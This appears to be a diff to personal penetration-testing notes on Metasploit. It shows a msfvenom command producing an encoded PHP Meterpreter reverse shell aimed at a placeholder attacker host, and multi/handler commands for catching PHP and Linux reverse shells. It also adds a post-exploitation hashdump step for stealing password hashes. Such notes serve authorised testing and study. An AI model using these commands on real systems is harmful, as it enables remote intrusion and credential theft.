@@ -75,9 +75,12 @@ $ msfvenom -l formats               <--You can either generate stand-alone paylo
 msfvenom -p php/meterpreter/reverse_tcp LHOST=ATTACKER -f raw -e php/base64     <-- -e parameter (encoding) The PHP version of Meterpreter was encoded in Base64, and the output format was raw   
 
 MsfVenom requires a "Handler" to catch the Shell (use Metasploit  | Cobalt Strike Listener)
-msf6>   use exploit/multi/handler     <-- SET options 
-msf6>   set payload php/reverse_php   <-- if using PHP reverse shell
+msf6>   use exploit/multi/handler                       <-- SET options 
+msf6>   set payload php/reverse_php                     <-- if using PHP reverse shell
+msf6>   set payload linux/x86/meterpreter/reverse_tcp   <-- if using Linux reverse shell
 msf6>   run
+
+meterpreter>    run post/linux/gather/hashdump
 
 NOTE: when gen php shell --> need to edit file to make it a working php file -> remove comments tags in <?php & add ?> at the EOF
 
